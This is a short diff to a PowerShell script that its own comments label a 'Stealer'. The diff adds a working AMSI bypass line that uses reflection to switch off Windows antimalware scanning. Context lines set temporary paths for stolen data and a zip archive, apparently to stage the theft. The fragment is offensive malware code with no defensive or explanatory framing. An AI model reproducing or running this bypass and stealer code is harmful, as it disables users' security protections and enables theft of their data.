@@ -1,3 +1,6 @@
+# AMSI Bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
 # Stealer with test message
 $T=$env:TEMP+"\stoler_data"
 $Z=$env:TEMP+"\data.zip"
